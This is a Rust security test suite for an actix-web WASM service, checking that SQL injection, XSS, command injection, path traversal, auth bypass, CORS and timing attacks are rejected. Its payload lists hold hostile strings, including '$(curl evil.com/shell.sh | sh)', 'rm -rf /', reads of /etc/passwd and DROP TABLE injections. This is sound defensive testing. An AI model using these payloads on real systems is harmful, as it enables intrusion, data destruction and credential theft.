use actix_web::{test, web, App};
use sqlx::PgPool;
use std::time::Duration;
use tokio::time::sleep;
use wasm_wizard::{
    app::configure_app,
    config::Settings,
    middleware::auth::ApiKey,
    models::{ExecuteRequest, UploadResponse},
};

#[actix_web::test]
async fn test_sql_injection_prevention() {
    let settings = Settings::from_env().expect("Failed to load settings");
    let pool = PgPool::connect(&settings.database.url)
        .await
        .expect("Failed to connect to database");

    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .app_data(web::Data::new(settings))
            .configure(configure_app),
    )
    .await;

    // Test SQL injection attempts in various endpoints
    let injection_payloads = vec![
        "'; DROP TABLE api_keys; --",
        "' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM api_keys--",
        "1; DELETE FROM wasm_modules WHERE 1=1--",
    ];

    for payload in injection_payloads {
        // Test injection in API key header
        let req = test::TestRequest::get()
            .uri("/api/wasm/modules")
            .insert_header(("X-API-Key", payload))
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(resp.status(), 401, "SQL injection attempt should be rejected");

        // Test injection in module ID parameter
        let req = test::TestRequest::delete()
            .uri(&format!("/api/wasm/modules/{}", payload))
            .insert_header(("X-API-Key", "test-key"))
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_ne!(resp.status(), 200, "SQL injection in path should fail");
    }
}

#[actix_web::test]
async fn test_xss_prevention() {
    let settings = Settings::from_env().expect("Failed to load settings");
    let pool = PgPool::connect(&settings.database.url)
        .await
        .expect("Failed to connect to database");

    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .app_data(web::Data::new(settings))
            .configure(configure_app),
    )
    .await;

    let xss_payloads = vec![
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "';alert('XSS');//",
    ];

    for payload in xss_payloads {
        // Test XSS in execute input
        let execute_req = ExecuteRequest {
            module_id: "test-id".to_string(),
            input: payload.to_string(),
        };

        let req = test::TestRequest::post()
            .uri("/api/wasm/execute")
            .insert_header(("X-API-Key", "test-key"))
            .set_json(&execute_req)
            .to_request();

        let resp = test::call_service(&app, req).await;
        let body = test::read_body(resp).await;
        let body_str = std::str::from_utf8(&body).unwrap_or("");

        // Ensure the payload is escaped in response
        assert!(!body_str.contains("<script>"), "XSS payload should be escaped");
        assert!(!body_str.contains("onerror="), "XSS event handlers should be escaped");
    }
}

#[actix_web::test]
async fn test_command_injection_prevention() {
    let settings = Settings::from_env().expect("Failed to load settings");
    let pool = PgPool::connect(&settings.database.url)
        .await
        .expect("Failed to connect to database");

    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .app_data(web::Data::new(settings))
            .configure(configure_app),
    )
    .await;

    let injection_payloads = vec![
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "`whoami`",
        "$(curl evil.com/shell.sh | sh)",
    ];

    for payload in injection_payloads {
        // Test command injection in execute input
        let execute_req = ExecuteRequest {
            module_id: "test-id".to_string(),
            input: payload.to_string(),
        };

        let req = test::TestRequest::post()
            .uri("/api/wasm/execute")
            .insert_header(("X-API-Key", "test-key"))
            .set_json(&execute_req)
            .to_request();

        let resp = test::call_service(&app, req).await;

        // The WASM sandbox should prevent any command execution
        // Response should either be error or sandboxed execution
        assert_ne!(resp.status(), 500, "Command injection should not cause server error");
    }
}

#[actix_web::test]
async fn test_rate_limiting_effectiveness() {
    let settings = Settings::from_env().expect("Failed to load settings");
    let pool = PgPool::connect(&settings.database.url)
        .await
        .expect("Failed to connect to database");

    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .app_data(web::Data::new(settings.clone()))
            .configure(configure_app),
    )
    .await;

    // Test that rate limiting blocks excessive requests
    let api_key = "test-rate-limit-key";
    let mut success_count = 0;
    let mut rate_limited_count = 0;

    // Make rapid requests to trigger rate limiting
    for i in 0..20 {
        let req = test::TestRequest::get()
            .uri("/api/wasm/modules")
            .insert_header(("X-API-Key", api_key))
            .to_request();

        let resp = test::call_service(&app, req).await;

        if resp.status() == 200 {
            success_count += 1;
        } else if resp.status() == 429 {
            rate_limited_count += 1;
        }

        // Small delay to simulate real requests
        if i < 10 {
            sleep(Duration::from_millis(10)).await;
        }
    }

    assert!(rate_limited_count > 0, "Rate limiting should trigger for excessive requests");
    assert!(
        success_count <= settings.rate_limit.requests_per_minute,
        "Should not exceed rate limit threshold"
    );
}

#[actix_web::test]
async fn test_authentication_bypass_attempts() {
    let settings = Settings::from_env().expect("Failed to load settings");
    let pool = PgPool::connect(&settings.database.url)
        .await
        .expect("Failed to connect to database");

    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .app_data(web::Data::new(settings))
            .configure(configure_app),
    )
    .await;

    // Test various authentication bypass attempts
    let bypass_attempts = vec![
        ("", "Empty API key"),
        ("null", "Null string"),
        ("undefined", "Undefined string"),
        ("admin", "Common default"),
        ("' OR '1'='1", "SQL injection in key"),
        ("../../etc/passwd", "Path traversal"),
    ];

    for (key, description) in bypass_attempts {
        let req = test::TestRequest::get()
            .uri("/api/wasm/modules")
            .insert_header(("X-API-Key", key))
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_eq!(
            resp.status(),
            401,
            "Authentication bypass attempt '{}' should be rejected",
            description
        );
    }

    // Test missing header
    let req = test::TestRequest::get()
        .uri("/api/wasm/modules")
        .to_request();

    let resp = test::call_service(&app, req).await;
    assert_eq!(resp.status(), 401, "Missing API key should be rejected");
}

#[actix_web::test]
async fn test_path_traversal_prevention() {
    let settings = Settings::from_env().expect("Failed to load settings");
    let pool = PgPool::connect(&settings.database.url)
        .await
        .expect("Failed to connect to database");

    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .app_data(web::Data::new(settings))
            .configure(configure_app),
    )
    .await;

    let traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..;/etc/passwd",
    ];

    for payload in traversal_payloads {
        // Test path traversal in module ID
        let req = test::TestRequest::get()
            .uri(&format!("/api/wasm/modules/{}", payload))
            .insert_header(("X-API-Key", "test-key"))
            .to_request();

        let resp = test::call_service(&app, req).await;
        assert_ne!(resp.status(), 200, "Path traversal attempt should fail");

        // Ensure no file system access occurred
        let body = test::read_body(resp).await;
        let body_str = std::str::from_utf8(&body).unwrap_or("");
        assert!(!body_str.contains("root:"), "Should not expose system files");
        assert!(!body_str.contains("Administrator:"), "Should not expose system files");
    }
}

#[actix_web::test]
async fn test_resource_exhaustion_prevention() {
    let settings = Settings::from_env().expect("Failed to load settings");
    let pool = PgPool::connect(&settings.database.url)
        .await
        .expect("Failed to connect to database");

    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .app_data(web::Data::new(settings.clone()))
            .configure(configure_app),
    )
    .await;

    // Test large payload rejection
    let large_input = "A".repeat(settings.wasm.max_input_size + 1);
    let execute_req = ExecuteRequest {
        module_id: "test-id".to_string(),
        input: large_input,
    };

    let req = test::TestRequest::post()
        .uri("/api/wasm/execute")
        .insert_header(("X-API-Key", "test-key"))
        .set_json(&execute_req)
        .to_request();

    let resp = test::call_service(&app, req).await;
    assert_eq!(resp.status(), 400, "Oversized input should be rejected");

    // Test memory limit enforcement
    // This would require a specially crafted WASM module that attempts to allocate excessive memory
    // The WASM runtime should enforce the memory limit configured in settings
}

#[actix_web::test]
async fn test_sensitive_data_exposure() {
    let settings = Settings::from_env().expect("Failed to load settings");
    let pool = PgPool::connect(&settings.database.url)
        .await
        .expect("Failed to connect to database");

    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .app_data(web::Data::new(settings))
            .configure(configure_app),
    )
    .await;

    // Test that errors don't leak sensitive information
    let req = test::TestRequest::get()
        .uri("/api/wasm/modules/invalid-uuid-format")
        .insert_header(("X-API-Key", "test-key"))
        .to_request();

    let resp = test::call_service(&app, req).await;
    let body = test::read_body(resp).await;
    let body_str = std::str::from_utf8(&body).unwrap_or("");

    // Ensure no database connection strings or internal paths are exposed
    assert!(!body_str.contains("postgres://"), "Database URL should not be exposed");
    assert!(!body_str.contains("/home/"), "Internal paths should not be exposed");
    assert!(!body_str.contains("password"), "Passwords should not be exposed");
    assert!(!body_str.contains("secret"), "Secrets should not be exposed");
}

#[actix_web::test]
async fn test_csrf_protection() {
    let settings = Settings::from_env().expect("Failed to load settings");
    let pool = PgPool::connect(&settings.database.url)
        .await
        .expect("Failed to connect to database");

    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .app_data(web::Data::new(settings))
            .configure(configure_app),
    )
    .await;

    // Test that state-changing operations require proper authentication
    // and can't be triggered by simple GET requests
    let req = test::TestRequest::get()
        .uri("/api/wasm/upload")
        .to_request();

    let resp = test::call_service(&app, req).await;
    assert_ne!(resp.status(), 200, "Upload should not work with GET request");

    // Test that cross-origin requests are properly handled
    let req = test::TestRequest::post()
        .uri("/api/wasm/upload")
        .insert_header(("Origin", "http://evil.com"))
        .insert_header(("X-API-Key", "test-key"))
        .to_request();

    let resp = test::call_service(&app, req).await;
    // Check CORS headers are properly set
    let headers = resp.headers();
    if let Some(cors) = headers.get("Access-Control-Allow-Origin") {
        assert_ne!(cors, "*", "CORS should not allow all origins");
    }
}

#[actix_web::test]
async fn test_timing_attack_mitigation() {
    let settings = Settings::from_env().expect("Failed to load settings");
    let pool = PgPool::connect(&settings.database.url)
        .await
        .expect("Failed to connect to database");

    let app = test::init_service(
        App::new()
            .app_data(web::Data::new(pool.clone()))
            .app_data(web::Data::new(settings))
            .configure(configure_app),
    )
    .await;

    // Test that authentication timing doesn't reveal information
    let mut timings = Vec::new();

    for i in 0..10 {
        let key = if i < 5 {
            "aaaaaaaaaaaaaaaa" // Wrong key starting with 'a'
        } else {
            "zzzzzzzzzzzzzzzz" // Wrong key starting with 'z'
        };

        let start = std::time::Instant::now();

        let req = test::TestRequest::get()
            .uri("/api/wasm/modules")
            .insert_header(("X-API-Key", key))
            .to_request();

        let _ = test::call_service(&app, req).await;

        timings.push(start.elapsed());
    }

    // Check that timing variations are minimal (constant-time comparison)
    let avg_a = timings[..5].iter().sum::<Duration>() / 5;
    let avg_z = timings[5..].iter().sum::<Duration>() / 5;

    let diff = if avg_a > avg_z {
        avg_a - avg_z
    } else {
        avg_z - avg_a
    };

    // Timing difference should be negligible (< 10ms)
    assert!(diff.as_millis() < 10, "Authentication should use constant-time comparison");
}
